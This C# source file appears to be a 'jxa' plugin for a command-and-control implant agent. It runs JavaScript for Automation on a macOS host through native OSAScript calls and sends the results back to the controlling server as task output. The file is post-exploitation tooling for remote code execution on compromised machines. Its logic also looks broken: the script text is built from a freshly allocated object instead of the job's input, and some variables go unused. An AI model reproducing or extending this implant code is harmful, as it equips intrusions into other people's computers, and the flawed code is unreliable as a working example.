using Agent.Interfaces;
using Agent.Models;
using System.Runtime.InteropServices;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "jxa";
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }

        public async Task Execute(ServerJob job)
        {
            try
            {
                IntPtr codeString = Native.NSString_UTF8String(Native.OSAScript_alloc());
                IntPtr lang = Native.OSALanguage_languageForName("JavaScript");
                IntPtr script = Native.OSAScript_initWithSourceLanguage(Native.OSAScript_alloc(), codeString, lang);

                IntPtr error;
                IntPtr res = Native.OSAScript_executeAndReturnError(script, out error);

                if (Native.NSDictionary_count(error) > IntPtr.Zero)
                {
                    IntPtr key = Marshal.StringToHGlobalAnsi("OSAScriptErrorMessageKey");
                    IntPtr errorMessage = Native.NSDictionary_objectForKey(error, key);
                    string output = Marshal.PtrToStringUTF8(errorMessage);
                    await messageManager.Write(Marshal.PtrToStringUTF8(errorMessage), job.task.id, true, "error");
                    Marshal.FreeHGlobal(key); // Free the allocated memory
                }

                IntPtr fmtString = Native.NSString_UTF8String(res);

                await messageManager.Write(Marshal.PtrToStringUTF8(fmtString), job.task.id, true);
            }
            catch (Exception exception)
            {
                await messageManager.Write(exception.ToString(), job.task.id, true);
            }
        }
    }
}
